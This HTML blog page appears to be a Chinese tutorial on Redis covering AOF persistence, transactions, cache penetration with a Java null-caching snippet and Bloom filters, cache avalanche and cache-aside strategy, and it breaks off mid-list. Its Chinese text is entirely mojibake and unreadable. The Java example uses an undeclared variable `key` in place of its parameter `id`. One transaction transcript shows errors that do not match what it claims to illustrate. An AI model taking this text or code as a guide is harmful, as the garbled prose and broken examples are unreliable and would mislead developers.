<p>AOFï¼ˆappend only fileï¼‰ ï¼š appendonly yesï¼Œå°†å‘½ä»¤éƒ½å†™å…¥ç£ç›˜ä¸­çš„AOFæ–‡ä»¶ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">appendfsync always    #æ¯æ¬¡æœ‰æ•°æ®ä¿®æ”¹å‘ç”Ÿæ—¶éƒ½ä¼šå†™å…¥ç£ç›˜AOFæ–‡ä»¶ï¼Œè¿™æ ·ä¼šä¸¥é‡é™ä½Redisçš„é€Ÿåº¦ã€‚</span><br><span class="line">appendfsync everysec  #æ¯ç§’é’ŸåŒæ­¥ä¸€æ¬¡ï¼Œæ˜¾ç¤ºåœ°å°†å¤šä¸ªå†™å‘½ä»¤åŒæ­¥åˆ°ç¡¬ç›˜ï¼Œæ¯ç§’ä¼šåˆ·æ–°ä¸€æ¬¡å»ç£ç›˜AOFæ–‡ä»¶ä¸­ï¼Œä¸¢å¤±å°äºä¸€ä¸ªbufferã€‚</span><br><span class="line">appendfsync no        #è®©æ“ä½œç³»ç»Ÿå†³å®šä½•æ—¶è¿›è¡Œå†™å›ç£ç›˜ï¼Œå¯èƒ½ä¼šä¸¢ä¸€ä¸ªbufferã€‚</span><br></pre></td></tr></table></figure>

<p>redis 4.0 æ”¯æŒæ··åˆæ¨¡å¼ï¼ˆé»˜è®¤å…³é—­ï¼Œaof-use-rdb-preambleå¼€å¯ï¼‰ï¼Œå¿«é€ŸåŠ è½½åŒæ—¶é¿å…ä¸¢å¤±è¿‡å¤šçš„æ•°æ®ï¼Œç¼ºç‚¹æ˜¯AOFé‡Œé¢çš„RDBéƒ¨åˆ†æ˜¯å‹ç¼©æ ¼å¼ä¸å†æ˜¯AOFæ ¼å¼ï¼Œå¯è¯»æ€§å·®ã€‚</p>
<h2 id="AOFé‡å†™"><a href="#AOFé‡å†™" class="headerlink" title="AOFé‡å†™"></a>AOFé‡å†™</h2><p>AOFé‡å†™å¯ä»¥äº§ç”Ÿä¸€ä¸ªæ–°çš„AOFæ–‡ä»¶ï¼ŒçŠ¶æ€ä¸€æ ·ï¼Œä½“ç§¯æ›´å°ã€‚</p>
<p>æ‰§è¡Œ BGREWRITEAOF å‘½ä»¤æ—¶ï¼ŒRedis æœåŠ¡å™¨ä¼šç»´æŠ¤ä¸€ä¸ª AOF é‡å†™ç¼“å†²åŒºï¼Œè¯¥ç¼“å†²åŒºä¼šåœ¨å­è¿›ç¨‹åˆ›å»ºæ–° AOF æ–‡ä»¶æœŸé—´ï¼Œè®°å½•æœåŠ¡å™¨æ‰§è¡Œçš„æ‰€æœ‰å†™å‘½ä»¤ã€‚å½“å­è¿›ç¨‹å®Œæˆåˆ›å»ºæ–° AOF æ–‡ä»¶çš„å·¥ä½œä¹‹åï¼ŒæœåŠ¡å™¨ä¼šå°†é‡å†™ç¼“å†²åŒºä¸­çš„æ‰€æœ‰å†…å®¹è¿½åŠ åˆ°æ–° AOF æ–‡ä»¶çš„æœ«å°¾ï¼Œä½¿å¾—æ–°æ—§ä¸¤ä¸ª AOF æ–‡ä»¶æ‰€ä¿å­˜çš„æ•°æ®åº“çŠ¶æ€ä¸€è‡´ã€‚æœ€åï¼ŒæœåŠ¡å™¨ç”¨æ–°çš„ AOF æ–‡ä»¶æ›¿æ¢æ—§çš„ AOF æ–‡ä»¶ï¼Œä»¥æ­¤æ¥å®Œæˆ AOF æ–‡ä»¶é‡å†™æ“ä½œã€‚</p>
<h2 id="Redis-äº‹åŠ¡"><a href="#Redis-äº‹åŠ¡" class="headerlink" title="Redis äº‹åŠ¡"></a>Redis äº‹åŠ¡</h2><p>åœ¨ç¬¬ä¸€ä¸ªçª—å£ï¼Œé€šè¿‡WATCHï¼Œç›‘æ§data1ï¼Œå¹¶å¼€å¯äº‹åŠ¡ï¼Œæ·»åŠ è®¾ç½®data2çš„å‘½ä»¤åˆ°å‘½ä»¤é˜Ÿåˆ—ä¸­ã€‚åœ¨ç¬¬äºŒä¸ªçª—å£ä¿®æ”¹data1ï¼Œ æ‰§è¡ŒEXECå‘½ä»¤ã€‚ç„¶ååœ¨çª—å£1æ‰§è¡ŒEXECå‘½ä»¤ï¼Œä¼šè¿”å›äº†ä¸€ä¸ªnilï¼Œè·å–data2çš„å€¼ï¼Œè¿”å›çš„ä¹Ÿæ˜¯nilã€‚å½“è¢«ç›‘æ§çš„æ•°æ®å‘ç”Ÿæ”¹å˜åï¼Œå¼€å¯çš„äº‹åŠ¡æ‰§è¡Œæ˜¯æ— æ³•æˆåŠŸçš„ï¼Œåªæœ‰è¢«ç›‘æ§çš„æ•°æ®ä¸å‘ç”Ÿå˜åŒ–ï¼Œäº‹åŠ¡æ‰èƒ½æ­£å¸¸æ‰§è¡Œã€‚ </p>
<p>Redis å¯ä»¥é€šè¿‡ <strong>MULTIï¼ŒEXECï¼ŒDISCARD ï¼ŒWATCHï¼ŒUNWATCH</strong> ç­‰å‘½ä»¤æ¥å®ç°äº‹åŠ¡ï¼ˆtransactionï¼‰åŠŸèƒ½ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; MULTI</span><br><span class="line">OK</span><br><span class="line">&gt; INCR foo</span><br><span class="line">QUEUED</span><br><span class="line">&gt; INCR bar</span><br><span class="line">QUEUED</span><br><span class="line">&gt; EXEC</span><br><span class="line">1) (<span class="built_in">integer</span>) 1</span><br><span class="line">2) (<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ MULTIå‘½ä»¤åå¯ä»¥è¾“å…¥å¤šä¸ªå‘½ä»¤ã€‚Redis ä¸ä¼šç«‹å³æ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œè€Œæ˜¯å°†å®ƒä»¬æ”¾åˆ°é˜Ÿåˆ—ï¼Œå½“è°ƒç”¨äº†EXECå‘½ä»¤å°†æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ã€‚</p>
<p>ä½†æ˜¯ï¼ŒRedis çš„äº‹åŠ¡å’Œå…³ç³»å‹æ•°æ®åº“çš„äº‹åŠ¡ä¸åŒã€‚äº‹åŠ¡å…·æœ‰å››å¤§ç‰¹æ€§ï¼š <strong>1. åŸå­æ€§</strong>ï¼Œ<strong>2. éš”ç¦»æ€§</strong>ï¼Œ<strong>3. æŒä¹…æ€§</strong>ï¼Œ<strong>4. ä¸€è‡´æ€§</strong>ã€‚</p>
<ol>
<li><strong>åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼š</strong> äº‹åŠ¡æ˜¯æœ€å°çš„æ‰§è¡Œå•ä½ï¼Œä¸å…è®¸åˆ†å‰²ã€‚äº‹åŠ¡çš„åŸå­æ€§ç¡®ä¿åŠ¨ä½œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå®Œå…¨ä¸èµ·ä½œç”¨ï¼›</li>
<li><strong>éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼š</strong> å¹¶å‘è®¿é—®æ•°æ®åº“æ—¶ï¼Œä¸€ä¸ªç”¨æˆ·çš„äº‹åŠ¡ä¸è¢«å…¶ä»–äº‹åŠ¡æ‰€å¹²æ‰°ï¼Œå„å¹¶å‘äº‹åŠ¡ä¹‹é—´æ•°æ®åº“æ˜¯ç‹¬ç«‹çš„ï¼›</li>
<li><strong>æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼š</strong> ä¸€ä¸ªäº‹åŠ¡è¢«æäº¤ä¹‹åã€‚å®ƒå¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜æ˜¯æŒä¹…çš„ï¼Œå³ä½¿æ•°æ®åº“å‘ç”Ÿæ•…éšœä¹Ÿä¸åº”è¯¥å¯¹å…¶æœ‰ä»»ä½•å½±å“ã€‚</li>
<li><strong>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼š</strong> æ‰§è¡Œäº‹åŠ¡å‰åï¼Œæ•°æ®ä¿æŒä¸€è‡´ï¼Œå¤šä¸ªäº‹åŠ¡å¯¹åŒä¸€ä¸ªæ•°æ®è¯»å–çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼›</li>
</ol>
<p><strong>Redis æ˜¯ä¸æ”¯æŒ roll back çš„ï¼Œå› è€Œä¸æ»¡è¶³åŸå­æ€§çš„ï¼ˆè€Œä¸”ä¸æ»¡è¶³æŒä¹…æ€§ï¼‰ã€‚</strong></p>
<p> Redis å¼€å‘è€…ä»¬è§‰å¾—æ²¡å¿…è¦æ”¯æŒå›æ»šï¼Œè¿™æ ·æ›´ç®€å•ä¾¿æ·å¹¶ä¸”æ€§èƒ½æ›´å¥½ã€‚Redis å¼€å‘è€…è§‰å¾—å³ä½¿å‘½ä»¤æ‰§è¡Œé”™è¯¯ä¹Ÿåº”è¯¥åœ¨å¼€å‘è¿‡ç¨‹ä¸­å°±è¢«å‘ç°è€Œä¸æ˜¯ç”Ÿäº§è¿‡ç¨‹ä¸­ã€‚</p>
<p>å¯ä»¥å°† Redis ä¸­çš„äº‹åŠ¡å°±ç†è§£ä¸º ï¼š<strong>Redis äº‹åŠ¡æä¾›äº†ä¸€ç§å°†å¤šä¸ªå‘½ä»¤è¯·æ±‚æ‰“åŒ…çš„åŠŸèƒ½ã€‚ç„¶åï¼Œå†æŒ‰é¡ºåºæ‰§è¡Œæ‰“åŒ…çš„æ‰€æœ‰å‘½ä»¤ï¼Œå¹¶ä¸”ä¸ä¼šè¢«ä¸­é€”æ‰“æ–­ã€‚</strong></p>
<p><strong>ç›¸å…³ issue</strong> :<a href="https://github.com/Snailclimb/JavaGuide/issues/452">issue452: å…³äº Redis äº‹åŠ¡ä¸æ»¡è¶³åŸå­æ€§çš„é—®é¢˜</a> ï¼Œæ¨èé˜…è¯»ï¼š<a href="https://zhuanlan.zhihu.com/p/43897838">https://zhuanlan.zhihu.com/p/43897838</a> ã€‚</p>
<p>ç¼–è¯‘å™¨é”™è¯¯ï¼ˆåªè¦æœ‰è¯­æ³•é”™è¯¯ï¼Œæ‰€æœ‰å‘½ä»¤éƒ½ä¸ä¼šæ‰§è¡Œï¼‰ï¼šåœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œå½“å‘½ä»¤å‡ºç°é”™è¯¯æ—¶ï¼Œåç»­å‘½ä»¤æ­£ç¡®ä¾æ—§æ˜¯å¯ä»¥æ·»åŠ åˆ°å‘½ä»¤é˜Ÿåˆ—ä¸­å»å¾—ï¼Œä½†æ˜¯ä½¿ç”¨ EXEC å‘½ä»¤æ‰§è¡Œå‘½ä»¤é˜Ÿåˆ—çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¥é”™ï¼Œé‡Œé¢ä¸€ä¸ªå‘½ä»¤éƒ½æ— æ³•æ‰§è¡Œã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt; </span><span class="language-bash">MULTI</span></span><br><span class="line">OK</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">incr <span class="built_in">test</span></span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash"><span class="built_in">set</span> <span class="built_in">test</span> bbbb</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ERR unknown command `ls`, with args beginning with: </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash"><span class="built_in">exec</span></span></span><br><span class="line">(error) ERR EXEC without MULTI</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">get <span class="built_in">test</span></span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash"><span class="built_in">exec</span></span></span><br><span class="line">(error) ERR EXEC without MULTI</span><br></pre></td></tr></table></figure>



<p>è¿è¡Œæ—¶é”™è¯¯ï¼ˆæ­£ç¡®çš„éƒ½ä¼šè¿è¡Œï¼Œé”™è¯¯çš„é‚£ä¸€æ¡å‘½ä»¤ä¸ä¼šæ‰§è¡Œï¼‰ï¼š è¿™ç§é”™è¯¯ä¸æ˜¯å‘½ä»¤é”™è¯¯ï¼Œè€Œæ˜¯å› ä¸ºå¯¹å‘½ä»¤ç†è§£ä¸é€å½»å‡ºç°çš„ä½¿ç”¨é”™è¯¯ã€‚ä¾‹å¦‚sadd æ˜¯è¿è¡Œæ—¶é”™è¯¯ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt; </span><span class="language-bash">multi</span></span><br><span class="line">OK</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash"><span class="built_in">set</span> <span class="built_in">test</span> bbb</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">sadd <span class="built_in">test</span> ddd</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash"><span class="built_in">set</span> <span class="built_in">test</span> ccc</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash"><span class="built_in">exec</span></span></span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">get <span class="built_in">test</span></span></span><br><span class="line">ccc</span><br></pre></td></tr></table></figure>

<h2 id="ç¼“å­˜ç©¿é€"><a href="#ç¼“å­˜ç©¿é€" class="headerlink" title="ç¼“å­˜ç©¿é€"></a>ç¼“å­˜ç©¿é€</h2><p>ç¼“å­˜ç©¿é€è¯´ç®€å•ç‚¹å°±æ˜¯å¤§é‡è¯·æ±‚çš„ key æ ¹æœ¬ä¸å­˜åœ¨äºç¼“å­˜ä¸­ï¼Œå¯¼è‡´è¯·æ±‚ç›´æ¥åˆ°äº†æ•°æ®åº“ä¸Šï¼Œæ ¹æœ¬æ²¡æœ‰ç»è¿‡ç¼“å­˜è¿™ä¸€å±‚ã€‚ä¾‹å¦‚ï¼šæŸä¸ªé»‘å®¢æ•…æ„åˆ¶é€ ç¼“å­˜ä¸­ä¸å­˜åœ¨çš„ key å‘èµ·å¤§é‡è¯·æ±‚ï¼Œå¯¼è‡´å¤§é‡è¯·æ±‚è½åˆ°æ•°æ®åº“ã€‚</p>
<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>æœ€åŸºæœ¬çš„å°±æ˜¯é¦–å…ˆåšå¥½å‚æ•°æ ¡éªŒï¼Œä¸€äº›ä¸åˆæ³•çš„å‚æ•°è¯·æ±‚ç›´æ¥æŠ›å‡ºå¼‚å¸¸ä¿¡æ¯è¿”å›ç»™å®¢æˆ·ç«¯ã€‚æ¯”å¦‚æŸ¥è¯¢çš„æ•°æ®åº“ id ä¸èƒ½å°äº0ã€ä¼ å…¥çš„é‚®ç®±æ ¼å¼ä¸å¯¹çš„æ—¶å€™ç›´æ¥è¿”å›é”™è¯¯æ¶ˆæ¯ç»™å®¢æˆ·ç«¯ç­‰ç­‰ã€‚</p>
<h4 id="ç¼“å­˜æ— æ•ˆkey"><a href="#ç¼“å­˜æ— æ•ˆkey" class="headerlink" title="ç¼“å­˜æ— æ•ˆkey"></a>ç¼“å­˜æ— æ•ˆkey</h4><p>å¦‚æœç¼“å­˜å’Œæ•°æ®åº“éƒ½æŸ¥ä¸åˆ°æŸä¸ª key çš„æ•°æ®å°±å†™ä¸€ä¸ªåˆ° Redis ä¸­å»å¹¶è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹: <code>SET key value EX 10086</code> ã€‚è¿™ç§æ–¹å¼å¯ä»¥è§£å†³è¯·æ±‚çš„ key å˜åŒ–ä¸é¢‘ç¹çš„æƒ…å†µï¼Œå¦‚æœé»‘å®¢æ¶æ„æ”»å‡»ï¼Œæ¯æ¬¡æ„å»ºä¸åŒçš„è¯·æ±‚ keyï¼Œä¼šå¯¼è‡´Redisä¸­ç¼“å­˜å¤§é‡æ— æ•ˆçš„ key ã€‚å¾ˆæ˜æ˜¾ï¼Œè¿™ç§æ–¹æ¡ˆå¹¶ä¸èƒ½ä»æ ¹æœ¬ä¸Šè§£å†³æ­¤é—®é¢˜ã€‚å¦‚æœéè¦ç”¨è¿™ç§æ–¹å¼æ¥è§£å†³ç©¿é€é—®é¢˜çš„è¯ï¼Œå°½é‡å°†æ— æ•ˆçš„ key çš„è¿‡æœŸæ—¶é—´è®¾ç½®çŸ­ä¸€ç‚¹æ¯”å¦‚ 1 åˆ†é’Ÿã€‚</p>
<p> key çš„è®¾è®¡ï¼š <code>è¡¨å:åˆ—å:ä¸»é”®å:ä¸»é”®å€¼</code> ã€‚</p>
<p>Java ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInclNullById</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">    <span class="comment">// ä»ç¼“å­˜ä¸­è·å–æ•°æ®</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">cacheValue</span> <span class="operator">=</span> cache.get(id);</span><br><span class="line">    <span class="comment">// ç¼“å­˜ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">if</span> (cacheValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// ä»æ•°æ®åº“ä¸­è·å–</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">storageValue</span> <span class="operator">=</span> storage.get(key);</span><br><span class="line">        <span class="comment">// ç¼“å­˜ç©ºå¯¹è±¡</span></span><br><span class="line">        cache.set(key, storageValue);</span><br><span class="line">        <span class="comment">// å¦‚æœå­˜å‚¨æ•°æ®ä¸ºç©ºï¼Œéœ€è¦è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´(300ç§’)</span></span><br><span class="line">        <span class="keyword">if</span> (storageValue == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å¿…é¡»è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå¦åˆ™æœ‰è¢«æ”»å‡»çš„é£é™©</span></span><br><span class="line">            cache.expire(key, <span class="number">60</span> * <span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> storageValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cacheValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å¸ƒéš†è¿‡æ»¤å™¨"><a href="#å¸ƒéš†è¿‡æ»¤å™¨" class="headerlink" title="å¸ƒéš†è¿‡æ»¤å™¨"></a>å¸ƒéš†è¿‡æ»¤å™¨</h4><p><a href="https://github.com/Snailclimb/JavaGuide/blob/master/docs/dataStructures-algorithms/data-structure/bloom-filter.md">ã€Šä¸äº†è§£å¸ƒéš†è¿‡æ»¤å™¨ï¼Ÿä¸€æ–‡ç»™ä½ æ•´çš„æ˜æ˜ç™½ç™½ï¼ã€‹</a> </p>
<p>é€šè¿‡å¸ƒéš†è¿‡æ»¤å™¨å¯ä»¥éå¸¸æ–¹ä¾¿åœ°åˆ¤æ–­ä¸€ä¸ªç»™å®šæ•°æ®æ˜¯å¦å­˜åœ¨äºæµ·é‡æ•°æ®ä¸­ã€‚</p>
<p>å…·ä½“åšæ³•å¦‚ä¸‹ï¼šæŠŠæ‰€æœ‰å¯èƒ½å­˜åœ¨çš„è¯·æ±‚çš„å€¼éƒ½å­˜æ”¾åœ¨å¸ƒéš†è¿‡æ»¤å™¨ä¸­ï¼Œå½“ç”¨æˆ·è¯·æ±‚è¿‡æ¥ï¼Œå…ˆåˆ¤æ–­ç”¨æˆ·å‘æ¥çš„è¯·æ±‚çš„å€¼æ˜¯å¦å­˜åœ¨äºå¸ƒéš†è¿‡æ»¤å™¨ä¸­ã€‚ä¸å­˜åœ¨çš„è¯ï¼Œç›´æ¥è¿”å›è¯·æ±‚å‚æ•°é”™è¯¯ä¿¡æ¯ç»™å®¢æˆ·ç«¯ï¼Œå­˜åœ¨çš„è¯æ‰ä¼šèµ°ä¸‹é¢çš„æµç¨‹ã€‚</p>
<p>å¸ƒéš†è¿‡æ»¤å™¨å¯èƒ½ä¼šå­˜åœ¨è¯¯åˆ¤çš„æƒ…å†µã€‚æ€»ç»“æ¥è¯´å°±æ˜¯ï¼š <strong>å¸ƒéš†è¿‡æ»¤å™¨è¯´æŸä¸ªå…ƒç´ å­˜åœ¨ï¼Œå°æ¦‚ç‡ä¼šè¯¯åˆ¤ã€‚å¸ƒéš†è¿‡æ»¤å™¨è¯´æŸä¸ªå…ƒç´ ä¸åœ¨ï¼Œé‚£ä¹ˆè¿™ä¸ªå…ƒç´ ä¸€å®šä¸åœ¨ã€‚ï¼ˆfalse positiveï¼‰</strong></p>
<p><strong>å½“ä¸€ä¸ªå…ƒç´ åŠ å…¥å¸ƒéš†è¿‡æ»¤å™¨ä¸­çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œä»¥ä¸‹æ“ä½œï¼š</strong></p>
<ol>
<li>ä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨ä¸­çš„å“ˆå¸Œå‡½æ•°å¯¹å…ƒç´ å€¼è¿›è¡Œè®¡ç®—ï¼Œå¾—åˆ°å“ˆå¸Œå€¼ï¼ˆæœ‰å‡ ä¸ªå“ˆå¸Œå‡½æ•°å¾—åˆ°å‡ ä¸ªå“ˆå¸Œå€¼ï¼‰ã€‚</li>
<li>æ ¹æ®å¾—åˆ°çš„å“ˆå¸Œå€¼ï¼Œåœ¨ä½æ•°ç»„ä¸­æŠŠå¯¹åº”ä¸‹æ ‡çš„å€¼ç½®ä¸º 1ã€‚</li>
</ol>
<p><strong>å½“æˆ‘ä»¬éœ€è¦åˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨äºå¸ƒéš†è¿‡æ»¤å™¨çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œä»¥ä¸‹æ“ä½œï¼š</strong></p>
<ol>
<li>å¯¹ç»™å®šå…ƒç´ å†æ¬¡è¿›è¡Œç›¸åŒçš„å“ˆå¸Œè®¡ç®—ï¼›</li>
<li>å¾—åˆ°å€¼ä¹‹ååˆ¤æ–­ä½æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ æ˜¯å¦éƒ½ä¸º 1ï¼Œå¦‚æœå€¼éƒ½ä¸º 1ï¼Œé‚£ä¹ˆè¯´æ˜è¿™ä¸ªå€¼å¯èƒ½åœ¨å¸ƒéš†è¿‡æ»¤å™¨ä¸­ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªå€¼ä¸ä¸º 1ï¼Œè¯´æ˜è¯¥å…ƒç´ ä¸åœ¨å¸ƒéš†è¿‡æ»¤å™¨ä¸­ã€‚</li>
</ol>
<p>ç„¶åï¼Œä¸€å®šä¼šå‡ºç°è¿™ç§æƒ…å†µï¼š<strong>ä¸åŒçš„å­—ç¬¦ä¸²å¯èƒ½å“ˆå¸Œå‡ºæ¥çš„ä½ç½®ç›¸åŒã€‚</strong> ï¼ˆå¯ä»¥é€‚å½“å¢åŠ ä½æ•°ç»„å¤§å°æˆ–è€…è°ƒæ•´å“ˆå¸Œå‡½æ•°æ¥é™ä½æ¦‚ç‡ï¼‰</p>
<h2 id="ç¼“å­˜é›ªå´©"><a href="#ç¼“å­˜é›ªå´©" class="headerlink" title="ç¼“å­˜é›ªå´©"></a>ç¼“å­˜é›ªå´©</h2><h3 id="ä»€ä¹ˆæ˜¯ç¼“å­˜é›ªå´©ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç¼“å­˜é›ªå´©ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç¼“å­˜é›ªå´©ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç¼“å­˜é›ªå´©ï¼Ÿ</h3><p><strong>ç¼“å­˜åœ¨åŒä¸€æ—¶é—´å¤§é¢ç§¯çš„å¤±æ•ˆï¼Œåé¢çš„è¯·æ±‚éƒ½ç›´æ¥è½åˆ°äº†æ•°æ®åº“ä¸Šï¼Œé€ æˆæ•°æ®åº“çŸ­æ—¶é—´å†…æ‰¿å—å¤§é‡è¯·æ±‚ã€‚</strong> è¿™å°±å¥½æ¯”é›ªå´©ä¸€æ ·ï¼Œæ‘§æ¯æ‹‰æœ½ä¹‹åŠ¿ï¼Œæ•°æ®åº“çš„å‹åŠ›å¯æƒ³è€ŒçŸ¥ï¼Œå¯èƒ½ç›´æ¥å°±è¢«è¿™ä¹ˆå¤šè¯·æ±‚å¼„å®•æœºäº†ã€‚</p>
<p>ä¾‹å¦‚ï¼šç³»ç»Ÿçš„ç¼“å­˜æ¨¡å—å‡ºäº†é—®é¢˜æ¯”å¦‚å®•æœºå¯¼è‡´ä¸å¯ç”¨ã€‚é€ æˆç³»ç»Ÿçš„æ‰€æœ‰è®¿é—®ï¼Œéƒ½è¦èµ°æ•°æ®åº“ã€‚</p>
<p><strong>æœ‰ä¸€äº›è¢«å¤§é‡è®¿é—®æ•°æ®ï¼ˆçƒ­ç‚¹ç¼“å­˜ï¼‰åœ¨æŸä¸€æ—¶åˆ»å¤§é¢ç§¯å¤±æ•ˆï¼Œå¯¼è‡´å¯¹åº”çš„è¯·æ±‚ç›´æ¥è½åˆ°äº†æ•°æ®åº“ä¸Šã€‚</strong> </p>
<p>ä¾‹å¦‚ ï¼šç§’æ€å¼€å§‹ 12 ä¸ªå°æ—¶ä¹‹å‰ï¼Œç»Ÿä¸€å­˜æ”¾äº†ä¸€æ‰¹å•†å“åˆ° Redis ä¸­ï¼Œè®¾ç½®çš„ç¼“å­˜è¿‡æœŸæ—¶é—´ä¹Ÿæ˜¯ 12 ä¸ªå°æ—¶ï¼Œé‚£ä¹ˆç§’æ€å¼€å§‹çš„æ—¶å€™ï¼Œè¿™äº›ç§’æ€çš„å•†å“çš„è®¿é—®ç›´æ¥å°±å¤±æ•ˆäº†ã€‚å¯¼è‡´çš„æƒ…å†µå°±æ˜¯ï¼Œç›¸åº”çš„è¯·æ±‚ç›´æ¥å°±è½åˆ°äº†æ•°æ®åº“ä¸Šï¼Œå°±åƒé›ªå´©ä¸€æ ·å¯æ€•ã€‚</p>
<h3 id="æœ‰å“ªäº›è§£å†³åŠæ³•ï¼Ÿ"><a href="#æœ‰å“ªäº›è§£å†³åŠæ³•ï¼Ÿ" class="headerlink" title="æœ‰å“ªäº›è§£å†³åŠæ³•ï¼Ÿ"></a>æœ‰å“ªäº›è§£å†³åŠæ³•ï¼Ÿ</h3><p><strong>é’ˆå¯¹ Redis æœåŠ¡ä¸å¯ç”¨çš„æƒ…å†µï¼š</strong></p>
<ol>
<li>é‡‡ç”¨ Redis é›†ç¾¤ï¼Œé¿å…å•æœºå‡ºç°é—®é¢˜æ•´ä¸ªç¼“å­˜æœåŠ¡éƒ½æ²¡åŠæ³•ä½¿ç”¨ã€‚</li>
<li>é™æµï¼Œé¿å…åŒæ—¶å¤„ç†å¤§é‡çš„è¯·æ±‚ã€‚</li>
</ol>
<p><strong>é’ˆå¯¹çƒ­ç‚¹ç¼“å­˜å¤±æ•ˆçš„æƒ…å†µï¼š</strong></p>
<ol>
<li>è®¾ç½®ä¸åŒçš„å¤±æ•ˆæ—¶é—´æ¯”å¦‚éšæœºè®¾ç½®ç¼“å­˜çš„å¤±æ•ˆæ—¶é—´ã€‚</li>
<li>ç¼“å­˜æ°¸ä¸å¤±æ•ˆã€‚</li>
</ol>
<h2 id="3ç§å¸¸ç”¨çš„ç¼“å­˜è¯»å†™ç­–ç•¥"><a href="#3ç§å¸¸ç”¨çš„ç¼“å­˜è¯»å†™ç­–ç•¥" class="headerlink" title="3ç§å¸¸ç”¨çš„ç¼“å­˜è¯»å†™ç­–ç•¥"></a>3ç§å¸¸ç”¨çš„ç¼“å­˜è¯»å†™ç­–ç•¥</h2><h3 id="Cache-Aside-Patternï¼ˆæ—è·¯ç¼“å­˜æ¨¡å¼ï¼‰"><a href="#Cache-Aside-Patternï¼ˆæ—è·¯ç¼“å­˜æ¨¡å¼ï¼‰" class="headerlink" title="Cache Aside Patternï¼ˆæ—è·¯ç¼“å­˜æ¨¡å¼ï¼‰"></a>Cache Aside Patternï¼ˆæ—è·¯ç¼“å­˜æ¨¡å¼ï¼‰</h3><p>Cache Aside Patternä¸­é‡åˆ°å†™è¯·æ±‚æ˜¯è¿™æ ·çš„ï¼šæ›´æ–°DBï¼Œç„¶åç›´æ¥åˆ é™¤ cache ã€‚</p>
<p>å¦‚æœæ›´æ–°æ•°æ®åº“æˆåŠŸï¼Œè€Œåˆ é™¤ç¼“å­˜è¿™ä¸€æ­¥å¤±è´¥çš„æƒ…å†µçš„è¯ï¼Œæœ‰ä¸¤ä¸ªè§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li>ç¼“å­˜å¤±æ•ˆæ—¶é—´å˜çŸ­ï¼ˆä¸æ¨èï¼Œæ²»æ ‡ä¸æ²»æœ¬ï¼‰ ï¼šè®©ç¼“å­˜æ•°æ®çš„è¿‡æœŸæ—¶é—´å˜çŸ­ï¼Œè¿™æ ·çš„è¯ç¼“å­˜å°±ä¼šä»æ•°æ®åº“ä¸­åŠ è½½æ•°æ®ã€‚å¦å¤–ï¼Œè¿™ç§è§£å†³åŠæ³•å¯¹äºå…ˆæ“ä½œç¼“å­˜åæ“ä½œæ•°æ®åº“çš„åœºæ™¯ä¸é€‚ç”¨ã€‚</li>
